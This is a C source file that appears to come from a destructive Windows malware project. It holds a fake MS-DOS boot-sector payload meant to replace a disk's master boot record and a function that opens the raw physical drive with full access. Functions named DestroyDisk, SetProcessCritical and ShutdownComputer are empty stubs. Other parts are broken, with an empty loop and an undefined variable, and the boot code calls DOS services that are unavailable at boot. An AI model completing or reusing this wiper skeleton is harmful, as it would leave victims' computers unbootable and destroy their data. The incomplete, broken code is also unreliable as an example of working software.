#include "esfera.h"

UCHAR Bootloader[ ] =
{
	0x53, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x4D, 0x53, 0x2D, 0x44, 0x4F, 0x53, 0x2E,
	0x2E, 0x2E, 0x24, 0x48, 0x49, 0x4D, 0x45, 0x4D, 0x20, 0x69, 0x73, 0x20, 0x54, 0x65, 0x73, 0x74,
	0x69, 0x6E, 0x67, 0x20, 0x65, 0x78, 0x74, 0x65, 0x6E, 0x64, 0x65, 0x64, 0x20, 0x6D, 0x65, 0x6D,
	0x6F, 0x72, 0x79, 0x2E, 0x2E, 0x2E, 0x24, 0x43, 0x3A, 0x5C, 0x3E, 0x43, 0x3A, 0x5C, 0x44, 0x4F,
	0x53, 0x5C, 0x53, 0x4D, 0x41, 0x52, 0x54, 0x44, 0x52, 0x56, 0x2E, 0x45, 0x58, 0x45, 0x20, 0x2F,
	0x58, 0x24, 0x43, 0x3A, 0x5C, 0x3E, 0x76, 0x65, 0x72, 0x20, 0x4D, 0x53, 0x2D, 0x44, 0x4F, 0x53,
	0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x20, 0x36, 0x2E, 0x32, 0x32, 0x24, 0x43, 0x3A,
	0x5C, 0x3E, 0x24, 0xB4, 0x09, 0xCD, 0x21, 0xC3, 0xB4, 0x02, 0xB2, 0x0D, 0xCD, 0x21, 0xB2, 0x0A,
	0xCD, 0x21, 0xC3, 0x8D, 0x16, 0x6E, 0x7C, 0xE8, 0xE9, 0xFF, 0xC3, 0xB9, 0xFF, 0xFF, 0xE2, 0xFE,
	0xC3, 0xB9, 0x05, 0x00, 0xB2, 0x2E, 0xB4, 0x02, 0xCD, 0x21, 0xE8, 0xEE, 0xFF, 0xE2, 0xF5, 0xC3,
	0x8D, 0x16, 0x00, 0x7C, 0xE8, 0xCC, 0xFF, 0xE8, 0xCE, 0xFF, 0xB9, 0x04, 0x00, 0xE8, 0xC8, 0xFF,
	0xE8, 0xD8, 0xFF, 0xE2, 0xF8, 0x8D, 0x16, 0x13, 0x7C, 0xE8, 0xB7, 0xFF, 0xE8, 0xB9, 0xFF, 0xE8,
	0xCF, 0xFF, 0xE8, 0xB3, 0xFF, 0xE8, 0xC3, 0xFF, 0xE8, 0xAD, 0xFF, 0x8D, 0x16, 0x37, 0x7C, 0xE8,
	0xA1, 0xFF, 0xE8, 0xA3, 0xFF, 0x8D, 0x16, 0x52, 0x7C, 0xE8, 0x97, 0xFF, 0xE8, 0x99, 0xFF, 0x8D,
	0x16, 0x6E, 0x7C, 0xE8, 0x8D, 0xFF, 0xE8, 0x8F, 0xFF, 0xE8, 0x97, 0xFF, 0xEB, 0xFB, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

BOOL
WINAPI
OverwriteMBR( 
	VOID
)
{
	DWORD dwBytesWritten;
	HANDLE hDrive = CreateFileW( L"\\\\.\\PhysicalDrive0", GENERIC_ALL, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
		FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL );
	CloseHandle( hDrive );
	return TRUE;
}

BOOL
WINAPI
DestroyDisk(
	VOID
)
{
	return TRUE;
}

VOID
WINAPI
ExtraMess(
	VOID
)
{
	HKEY hKeys[ ] = { };
	INT nCount = sizeof( hKeys ) / sizeof( hKeys[ 0 ] ), nExes = sizeof( lpExes ) / sizeof( lpExes[ 0 ] );
	for ( INT i = 0; i < nCount; i++ )

	for ( INT i = 0; i < nExes; i++ )
	{
	}
}
BOOL
WINAPI
SetProcessCritical(
	VOID
)
{
	return TRUE;
}

BOOL
WINAPI
ShutdownComputer(
	VOID
)
{
	return TRUE;
}